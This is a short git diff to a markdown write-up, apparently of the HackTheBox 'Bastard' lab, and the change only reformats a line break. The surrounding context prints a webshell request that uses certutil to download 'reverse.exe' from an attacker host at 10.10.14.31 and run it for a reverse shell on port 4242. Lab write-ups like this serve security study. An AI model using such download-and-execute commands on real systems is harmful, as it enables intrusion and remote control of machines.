@@ -73,7 +73,8 @@ I then downloaded that on the target machine with certutil, using the webshell: 
 
 ```bash
 10.10.10.9/test.php?cmd=certutil -urlcache -split -f "http://10.10.14.31/reverse.exe" reverse.exe
-``` </br>
+```
+</br>
 Ran the file while listening to port 4242 on my Kali: </br>
 ![initial_shell_poc](images/bastard/initial_shell_poc.png) </br>
 **Vulnerability Explanation:** One of the feature of the module is that one can control the input/output format by changing the
